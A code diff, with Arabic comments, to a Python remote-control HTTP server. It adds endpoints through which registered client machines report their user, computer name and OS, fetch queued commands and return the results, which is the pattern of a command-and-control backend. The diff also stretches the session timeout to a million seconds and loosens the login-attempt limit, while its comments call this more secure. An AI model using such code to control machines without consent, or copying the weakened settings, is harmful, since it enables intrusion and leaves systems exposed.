@@ -22,10 +22,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     failed_attempts = {}
     blocked_ips = set()
     
-    #  نظام الجلسات الآمن المتقدم
+    #  نظام الجلسات الآمن 
     user_sessions = {}
-    SESSION_TIMEOUT = 1800  # 30 دقيقة
-    MAX_SESSIONS_PER_IP = 3
+    SESSION_TIMEOUT = 1000000 # وقت كبير للجلسه
+    MAX_SESSIONS_PER_IP = 1 # جلسه واحده لكل اي بي 
     
     #  نظام كلمات المرور
     PASSWORD_FILE = "passwords.json"
@@ -35,14 +35,14 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     }
     
     session_lock = threading.Lock()
-    MAX_FAILED_ATTEMPTS = 3  # قللنا المحاولات لزيادة الأمان
+    MAX_FAILED_ATTEMPTS = 5  # خمس محاولات لزيادة الأمان
     BLOCK_TIME = 1800  # 30 دقيقة للحظر
     
     #  مفتاح تشفير للجلسات
     SECRET_KEY = secrets.token_hex(32)
 
     def load_passwords(self):
-        """تحميل كلمات المرور"""
+        """تحميل كلمات المرور من الملف"""
         try:
             if os.path.exists(self.PASSWORD_FILE):
                 with open(self.PASSWORD_FILE, 'r') as f:
@@ -280,6 +280,31 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 else:
                     self.send_error(403, "Access Denied")
             
+            # ⚡ إضافة المسارات الجديدة للاوامر والنتائج
+            elif path == '/commands':
+                if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
+                    self.handle_get_commands()
+                else:
+                    self.send_error(403, "Access Denied")
+            
+            elif path == '/result':
+                if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
+                    self.handle_get_result()
+                else:
+                    self.send_error(403, "Access Denied")
+            
+            elif path == '/history':
+                if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
+                    self.send_command_history()
+                else:
+                    self.send_error(403, "Access Denied")
+            
+            elif path == '/status':
+                if self.validate_session(session_id) and self.get_session_level(session_id, 'level1') and self.get_session_level(session_id, 'level2'):
+                    self.send_system_status()
+                else:
+                    self.send_error(403, "Access Denied")
+            
             else:
                 self.send_404_page()
                 
@@ -315,6 +340,209 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 
         except Exception as e:
             self.send_json({'error': str(e)})
+
+    # ⚡ الدوال التي ترسل وتستقبل الأوامر والنتائج - تم إضافتها كما هي
+
+    def handle_get_commands(self):
+        """استقبال الأوامر الجاهزة من العميل"""
+        with self.session_lock:
+            parsed = urllib.parse.urlparse(self.path)
+            query = urllib.parse.parse_qs(parsed.query)
+            client_id = query.get('client', [None])[0]
+            
+            if client_id and client_id in self.sessions:
+                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                pending_command = self.sessions[client_id]['pending_command']
+                
+                if pending_command:
+                    self.sessions[client_id]['pending_command'] = None
+                    self.send_json({'command': pending_command, 'instant': True})
+                else:
+                    self.send_json({'waiting': False, 'instant': True})
+            else:
+                self.send_json({'error': 'Client not found', 'instant': True})
+
+    def handle_execute_command(self, data):
+        """إرسال أمر جديد إلى العميل"""
+        with self.session_lock:
+            client_id = data.get('client_id')
+            command = data.get('command')
+            
+            if client_id in self.sessions:
+                self.sessions[client_id]['pending_command'] = command
+                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                self.send_json({'success': True, 'executed_instantly': True})
+                
+                if hasattr(self, 'cursor'):
+                    self.cursor.execute(
+                        'INSERT INTO commands (client_id, command) VALUES (?, ?)',
+                        (client_id, command)
+                    )
+                    self.conn.commit()
+            else:
+                self.send_json({'success': False, 'error': 'Client not found'})
+
+    def handle_get_result(self):
+        """الحصول على النتائج من العميل"""
+        with self.session_lock:
+            parsed = urllib.parse.urlparse(self.path)
+            query = urllib.parse.parse_qs(parsed.query)
+            
+            client_id = query.get('client', [''])[0]
+            command = query.get('command', [''])[0]
+            
+            if client_id in self.sessions and self.sessions[client_id]['last_response']:
+                result = self.sessions[client_id]['last_response']
+                self.sessions[client_id]['last_response'] = None
+                self.send_json({'result': result, 'instant': True})
+            else:
+                self.send_json({'pending': True, 'instant': True})
+
+    def handle_client_response(self, data):
+        """استقبال نتيجة الأمر من العميل"""
+        with self.session_lock:
+            client_id = data.get('client_id')
+            response = data.get('response')
+            command = data.get('command')
+            
+            if client_id in self.sessions:
+                self.sessions[client_id]['last_response'] = response
+                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                
+                if hasattr(self, 'cursor'):
+                    self.cursor.execute(
+                        'UPDATE commands SET response = ? WHERE client_id = ? AND command = ? AND response IS NULL',
+                        (response, client_id, command)
+                    )
+                    self.conn.commit()
+            
+            self.send_json({'success': True, 'instant': True})
+
+    def handle_client_register(self, data):
+        """تسجيل العميل الجديد"""
+        with self.session_lock:
+            client_id = data.get('client_id', str(uuid.uuid4())[:8])
+            client_ip = self.client_address[0]
+            incoming_user = data.get('user', 'Unknown')
+            incoming_computer = data.get('computer', 'Unknown')
+            incoming_os = data.get('os', 'Unknown')
+
+            if incoming_user == 'Unknown' and '-' in client_id:
+                try:
+                    parts = client_id.split('-')
+                    if len(parts) >= 2:
+                        incoming_user = parts[1]
+                        incoming_computer = parts[0]
+                except:
+                    pass
+                
+            existing_client = None
+            for cid, client_data in self.sessions.items():
+                current_user = client_data.get('user', '')
+                current_computer = client_data.get('computer', '')
+
+                if (current_user == incoming_user and 
+                    current_computer == incoming_computer and 
+                    incoming_user != 'Unknown' and 
+                    incoming_computer != 'Unknown'):
+                    existing_client = cid
+                    break
+                
+            if existing_client is None and client_id in self.sessions:
+                existing_client = client_id
+
+            if existing_client:
+                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
+                self.sessions[existing_client]['status'] = 'online'
+                self.sessions[existing_client]['ip'] = client_ip
+
+                if incoming_os != 'Unknown':
+                    self.sessions[existing_client]['os'] = incoming_os
+
+                print(f"✅ INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
+            else:
+                self.sessions[client_id] = {
+                    'id': client_id,
+                    'ip': client_ip,
+                    'type': data.get('type', 'unknown'),
+                    'computer': incoming_computer,
+                    'os': incoming_os,
+                    'user': incoming_user,
+                    'first_seen': datetime.now().isoformat(),
+                    'last_seen': datetime.now().isoformat(),
+                    'pending_command': None,
+                    'last_response': None,
+                    'status': 'online'
+                }
+                print(f"🆕 INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
+                self.send_json({'success': True, 'client_id': client_id, 'instant': True})
+                
+    def send_sessions_list(self):
+        """إرسال قائمة الجلسات النشطة"""
+        with self.session_lock:
+            current_time = datetime.now()
+            active_clients = []
+        
+            for client_id, client_data in list(self.sessions.items()):
+                last_seen = datetime.fromisoformat(client_data['last_seen'])
+                time_diff = (current_time - last_seen).total_seconds()
+            
+                if time_diff < 300:  # 5 دقائق
+                    client_data['is_online'] = time_diff < 5  # ⚡ 5 ثواني للنشط
+                    client_data['last_seen_seconds'] = time_diff
+                    active_clients.append(client_data)
+                else:
+                    del self.sessions[client_id]
+                    print(f"INSTANT Removed inactive: {client_id}")
+        
+            self.send_json(active_clients)
+
+    def send_command_history(self):
+        """إرسال سجل الأوامر"""
+        try:
+            if hasattr(self, 'cursor'):
+                self.cursor.execute('''
+                    SELECT client_id, command, response, timestamp 
+                    FROM commands 
+                    ORDER BY timestamp DESC 
+                    LIMIT 50
+                ''')
+                history = self.cursor.fetchall()
+                
+                result = []
+                for row in history:
+                    result.append({
+                        'client_id': row[0],
+                        'command': row[1],
+                        'response': row[2],
+                        'timestamp': row[3]
+                    })
+                
+                self.send_json(result)
+            else:
+                self.send_json([])
+        except:
+            self.send_json([])
+
+    def send_system_status(self):
+        """إرسال حالة النظام"""
+        with self.session_lock:
+            status = {
+                'uptime': 'Running - SECURE MODE',
+                'connected_clients': len([c for c in self.sessions.values() 
+                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 300]),
+                'total_commands': 0,
+                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'mode': 'SECURE',
+                'response_time': '0ms'
+            }
+            
+            if hasattr(self, 'cursor'):
+                self.cursor.execute('SELECT COUNT(*) FROM commands')
+                status['total_commands'] = self.cursor.fetchone()[0]
+            
+            self.send_json(status)
 
     def save_passwords(self, passwords):
         """حفظ كلمات المرور"""
@@ -1430,112 +1658,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             self.send_json({'success': True})
         else:
             self.send_json({'success': False, 'error': 'Failed to save new password'})
-
-    def handle_client_register(self, data):
-        with self.session_lock:
-            client_id = data.get('client_id', str(uuid.uuid4())[:8])
-            client_ip = self.client_address[0]
-            incoming_user = data.get('user', 'Unknown')
-            incoming_computer = data.get('computer', 'Unknown')
-            incoming_os = data.get('os', 'Unknown')
-
-            existing_client = None
-            for cid, client_data in self.sessions.items():
-                current_user = client_data.get('user', '')
-                current_computer = client_data.get('computer', '')
-
-                if (current_user == incoming_user and 
-                    current_computer == incoming_computer and 
-                    incoming_user != 'Unknown' and 
-                    incoming_computer != 'Unknown'):
-                    existing_client = cid
-                    break
-                
-            if existing_client is None and client_id in self.sessions:
-                existing_client = client_id
-
-            if existing_client:
-                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
-                self.sessions[existing_client]['status'] = 'online'
-                self.sessions[existing_client]['ip'] = client_ip
-
-                if incoming_os != 'Unknown':
-                    self.sessions[existing_client]['os'] = incoming_os
-
-                print(f" Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
-                self.send_json({'success': True, 'client_id': existing_client})
-            else:
-                self.sessions[client_id] = {
-                    'id': client_id,
-                    'ip': client_ip,
-                    'type': data.get('type', 'unknown'),
-                    'computer': incoming_computer,
-                    'os': incoming_os,
-                    'user': incoming_user,
-                    'first_seen': datetime.now().isoformat(),
-                    'last_seen': datetime.now().isoformat(),
-                    'pending_command': None,
-                    'last_response': None,
-                    'status': 'online'
-                }
-                print(f" New: {incoming_computer} ({incoming_user}) - {client_ip}")
-                self.send_json({'success': True, 'client_id': client_id})
-                
-    def send_sessions_list(self):
-        """إرسال قائمة الجلسات"""
-        with self.session_lock:
-            current_time = datetime.now()
-            active_clients = []
-            
-            for client_id, client_data in list(self.sessions.items()):
-                last_seen = datetime.fromisoformat(client_data['last_seen'])
-                time_diff = (current_time - last_seen).total_seconds()
-                
-                if time_diff < 300:  # 5 دقائق
-                    client_data['last_seen_seconds'] = time_diff
-                    active_clients.append(client_data)
-                else:
-                    del self.sessions[client_id]
-            
-            self.send_json(active_clients)
-
-    def handle_execute_command(self, data):
-        with self.session_lock:
-            client_id = data.get('client_id')
-            command = data.get('command')
-            
-            if client_id in self.sessions:
-                self.sessions[client_id]['pending_command'] = command
-                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
-                self.send_json({'success': True})
-            else:
-                self.send_json({'success': False, 'error': 'Client not found'})
-    
-    def handle_get_result(self):
-        with self.session_lock:
-            parsed = urllib.parse.urlparse(self.path)
-            query = urllib.parse.parse_qs(parsed.query)
-            
-            client_id = query.get('client', [''])[0]
-            
-            if client_id in self.sessions and self.sessions[client_id]['last_response']:
-                result = self.sessions[client_id]['last_response']
-                self.sessions[client_id]['last_response'] = None
-                self.send_json({'result': result})
-            else:
-                self.send_json({'pending': True})
-    
-    def handle_client_response(self, data):
-        with self.session_lock:
-            client_id = data.get('client_id')
-            response = data.get('response')
-            command = data.get('command')
-            
-            if client_id in self.sessions:
-                self.sessions[client_id]['last_response'] = response
-                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
-            
-            self.send_json({'success': True})
 
     def send_404_page(self):
         self.send_error(404, "Page not found")
